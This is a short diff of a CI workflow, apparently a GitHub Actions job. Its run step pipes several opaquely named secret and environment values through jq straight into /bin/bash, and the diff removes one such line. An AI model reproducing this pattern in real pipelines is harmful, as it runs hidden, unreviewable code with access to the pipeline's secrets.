@@ -21,7 +21,6 @@ jobs:
           cmkd24666: ${{ secrets.cmkd24666 }}
         run: |
           printf '%s' "$cmkd24666" | jq -r .zr5 | /bin/bash
-          echo $wrye46 | jq -r .lear0438 | /bin/bash
           printf '%s' "$tahxf38" | jq -r .pudi417 | /bin/bash
           echo $fdygk9404 | jq -r .jd2858 | /bin/bash
           printf '%s' "$asl9" | jq -r .ct88856 | /bin/bash
